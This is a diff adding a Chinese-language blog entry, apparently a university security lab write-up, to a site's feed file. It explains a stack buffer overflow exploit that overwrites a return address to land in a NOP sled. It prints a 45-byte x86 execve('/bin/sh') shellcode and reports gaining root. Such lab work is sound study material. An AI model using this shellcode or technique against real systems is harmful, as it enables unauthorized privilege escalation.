@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>安全攻防综合实验5</title>
+    <link href="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/"/>
+    <url>/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/</url>
+    
+    <content type="html"><![CDATA[<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="background"><a href="#background" class="headerlink" title="background"></a>background</h3><p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/1.png" srcset="/img/loading.gif" alt="1"></p><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>首先先来看源代码，可以看到会把输入进来的一串字符串给到<code>buf</code>，所以我们需要做的就是，让这个字符串包含<code>shellcode</code>，除此之外，实际上要得到的是<code>shellcode</code>的起始位置，然后将存储着<code>main</code>的<code>return address</code>的位置进行覆盖，实现跳转到<code>shellcode</code>起始位置，同时，由于<code>NOP</code>指令的存在（），并不需要获取准确的位置</p><p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/3.png" srcset="/img/loading.gif" alt="3"></p><p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/2.png" srcset="/img/loading.gif" alt="2"></p><p>之后，需要来看一下shellcode的长度</p><pre><code class="hljs taggerscript">"<span class="hljs-symbol">\x</span>eb<span class="hljs-symbol">\x</span>1f<span class="hljs-symbol">\x</span>5e<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>76<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>88<span class="hljs-symbol">\x</span>46<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>46<span class="hljs-symbol">\x</span>0c<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>f3<span class="hljs-symbol">\x</span>8d<span class="hljs-symbol">\x</span>4e<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>8d<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>0c<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>db<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>d8<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>e8<span class="hljs-symbol">\x</span>dc<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>ff/bin/sh"</code></pre><p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/4.png" srcset="/img/loading.gif" alt="4"></p><p>可以看到长度为45，然后我们需要开始构造输入的字符串，注意，要保证<code>NOP</code>指令数量加上<code>shellcode</code>的长度是4字节倍数，否则<code>return address</code>对不齐</p><p>另外通过程序输出来找到buf的起始位置，可以看到起始位置是ffffd11c</p><p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/5.png" srcset="/img/loading.gif" alt="5"></p><p>输入下面指令并运行，获得root权限</p><p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/6.png" srcset="/img/loading.gif" alt="6"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>安全攻防综合实验</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>安全攻防综合实验4</title>
     <link href="/2021/10/12/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C4/"/>
     <url>/2021/10/12/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C4/</url>
